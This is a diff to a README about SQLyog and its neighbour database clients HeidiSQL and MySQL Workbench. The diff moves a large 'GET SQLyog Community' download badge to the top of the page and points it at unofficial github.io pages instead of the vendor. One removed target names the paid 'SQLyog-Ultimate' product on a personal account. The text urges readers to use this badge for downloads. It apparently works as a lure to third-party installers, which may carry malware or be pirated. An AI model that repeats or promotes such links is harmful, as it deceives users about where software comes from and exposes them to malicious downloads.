@@ -10,6 +10,8 @@ Wine on Ubuntu is the documented Linux path. There is no official sqlyog for lin
 
 Two neighbor trees in this pack are the same class. HeidiSQL is a light desktop client for MariaDB, MySQL, SQL Server, PostgreSQL, SQLite, Interbase, and Firebird. MySQL Workbench is Oracle's MySQL GUI: SQL editor, modeler, admin, and migration. Use them when you want a second MySQL desktop next to sqlyog community edition.
 
+[![GET SQLyog Community](https://img.shields.io/badge/GET-SQLyog%20Community-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://sqlyog-community-edition.github.io/SQLyog-Community/)
+
 | Engine | SQLyog | HeidiSQL | Workbench |
 | --- | --- | --- | --- |
 | MySQL | Yes | Yes | Yes (5.6+) |
@@ -202,8 +204,6 @@ HeidiSQL pull requests without a ticket id get bounced. Fill the issue template 
 Icons8 assets stay in HeidiSQL. If you fork HeidiSQL for something else, drop those icons.
 
 ## Download
-
-[![GET SQLyog Community](https://img.shields.io/badge/GET-SQLyog%20Community-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://gregorianudelman.github.io/.github/SQLyog-Ultimate)
 
 Use the GET badge for this pack. sqlyog community edition is also on the official GitHub downloads wiki. SQLyog Ultimate is a paid installer from the vendor store, with a time-limited trial. HeidiSQL and Workbench ship their own builds.
 
